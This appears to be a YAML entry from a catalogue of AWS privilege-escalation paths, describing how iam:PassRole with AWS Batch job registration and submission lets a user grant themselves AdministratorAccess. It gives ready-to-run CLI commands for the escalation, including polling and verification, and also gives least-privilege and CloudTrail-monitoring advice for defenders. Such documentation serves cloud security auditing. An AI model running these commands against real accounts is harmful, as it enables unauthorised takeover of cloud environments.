id: batch-001
name: iam:PassRole + batch:RegisterJobDefinition + batch:SubmitJob
category: new-passrole
services:
  - iam
  - batch

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must be able to pass the target admin IAM role and a Batch execution role to the Batch service
    - permission: batch:RegisterJobDefinition
      resourceConstraints: No resource constraints required
    - permission: batch:SubmitJob
      resourceConstraints: No resource constraints required
  additional:
    - permission: batch:DescribeJobs
      resourceConstraints: Useful for polling job status to confirm execution
    - permission: batch:DescribeJobQueues
      resourceConstraints: Helpful for discovering available job queues to submit to
    - permission: batch:DescribeComputeEnvironments
      resourceConstraints: Helpful for discovering available compute environments
    - permission: batch:DeregisterJobDefinition
      resourceConstraints: Useful for cleaning up the malicious job definition after exploitation
    - permission: iam:ListAttachedUserPolicies
      resourceConstraints: Useful for verifying privilege escalation success

description: A principal with `iam:PassRole`, `batch:RegisterJobDefinition`, and `batch:SubmitJob` can escalate privileges by registering a new AWS Batch job definition that passes an admin IAM role as the `jobRoleArn`, then submitting a job that overrides the container command to call `iam:AttachUserPolicy`, attaching AdministratorAccess to the starting user. The Fargate container runs with the admin role's credentials and performs the IAM escalation.

prerequisites:
  admin:
    - A role must exist that trusts batch.amazonaws.com to assume it (or can be assumed via the Batch Fargate execution chain)
    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
    - An existing Batch job queue and compute environment must be available in the account
  lateral:
    - A role must exist that trusts the Batch service and has elevated permissions
    - An existing Batch job queue and compute environment must be available in the account

exploitationSteps:
  awscli:
    - step: 1
      command: |
        aws batch register-job-definition \
          --job-definition-name privesc-job-def \
          --type container \
          --platform-capabilities FARGATE \
          --container-properties '{
            "image": "amazon/aws-cli:latest",
            "jobRoleArn": "arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE",
            "executionRoleArn": "arn:aws:iam::ACCOUNT_ID:role/EXECUTION_ROLE",
            "resourceRequirements": [
              {"type": "VCPU", "value": "0.25"},
              {"type": "MEMORY", "value": "512"}
            ],
            "networkConfiguration": {"assignPublicIp": "ENABLED"},
            "command": [
              "iam", "attach-user-policy",
              "--user-name", "STARTING_USER",
              "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
            ]
          }'
      description: Register a new Batch job definition that passes an admin IAM role as the jobRoleArn. The container command calls iam:AttachUserPolicy to escalate privileges when executed.
    - step: 2
      command: |
        aws batch submit-job \
          --job-name privesc-job \
          --job-queue JOB_QUEUE_NAME \
          --job-definition privesc-job-def:1
      description: Submit the Batch job to the queue. The Fargate container starts, assumes the admin jobRoleArn, and executes the command to attach AdministratorAccess to the starting user.
    - step: 3
      command: |
        aws batch describe-jobs \
          --jobs JOB_ID \
          --query 'jobs[0].status' \
          --output text
      description: Poll the job status. Once it reaches SUCCEEDED, AdministratorAccess has been attached to the starting user.
    - step: 4
      command: |
        aws iam list-attached-user-policies \
          --user-name STARTING_USER
      description: Verify privilege escalation success by confirming AdministratorAccess is now attached to the starting user.

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative Batch job roles** - Very rarely does a Batch job need administrative access. Use the principle of least privilege and scope job roles to only the data and services the job legitimately requires.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificBatchJobRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "batch.amazonaws.com"
      }
    }
  }
  ```

  - **Restrict `batch:RegisterJobDefinition`** - This permission lets any holder define arbitrary container workloads with any role. Restrict it to trusted CI/CD principals only.
  - Monitor CloudTrail for unusual Batch job definition registrations followed by immediate job submission
  - Monitor CloudTrail for Batch job definitions registered by principals who do not usually create job definitions
  - Monitor CloudTrail for roles being passed to Batch that haven't been used before
  - Monitor and alert on Batch job definitions that reference privileged roles
  - Regularly audit Batch job definitions and execution roles for excessive IAM permissions
  - Regularly audit all IAM roles that trust the Batch service and down-scope any roles with administrative access

limitations: |
  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks.

